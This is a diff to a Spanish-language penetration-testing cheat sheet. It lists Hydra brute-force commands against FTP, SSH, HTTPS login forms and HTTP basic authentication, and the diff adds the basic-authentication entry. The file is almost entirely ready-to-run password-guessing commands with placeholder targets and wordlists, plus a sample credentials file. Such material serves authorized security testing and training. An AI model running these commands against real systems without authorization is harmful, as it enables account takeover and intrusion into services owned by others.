@@ -16,22 +16,27 @@
 
 #### Cracking con Brute Force en FTP Server
 ```
-hydra -t 1 -l admin -P <path-to-password.lst> -vV <IPaddress> ftp
+hydra -t 1 -l admin -P <PATH-TO-PASSWORD.lst> -vV <IP-ADDRESS> ftp
 ```
 
 #### Cracking con Brute Force en SSH Server
 ```
-hydra -l msfadmin -P <path-to-password.lst> -vV <IPaddress> ssh
+hydra -l msfadmin -P <PATH-TO-PASSWORD.lst> -vV <IP-ADDRESS> ssh
 ```
 
 #### Cracking con Brute Force en WEB Login Server
 ```
-hydra -l none -P <path-to-password.lst> <IPaddress> https-form-post "/db/index.php:password=^PASS^&login=Log+In&proc_login=true:Incorrect password" -t 64
+hydra -l none -P <PATH-TO-PASSWORD.lst> <IP-ADDRESS> https-form-post "/db/index.php:password=^PASS^&login=Log+In&proc_login=true:Incorrect password" -t 64
+```
+
+#### Ataque de Fuerza Bruta a una Authenticacion Basica
+```
+hydra -l admin -P <PATH-TO-PASSWORD.lst> -s 80 -f <IP-ADDRESS> http-get
 ```
 
 #### Cracking con Brute Force en WEB Login Server, enviando 'usuario:password'
 ```
-hydra -C credentials.txt <IPaddress> https-form-post "/login.php:username=^USER^&password=^PASS^:F=Login failed"
+hydra -C credentials.txt <IP-ADDRESS> https-form-post "/login.php:username=^USER^&password=^PASS^:F=Login failed"
 
 Archivo credentials.txt:
 albert:password
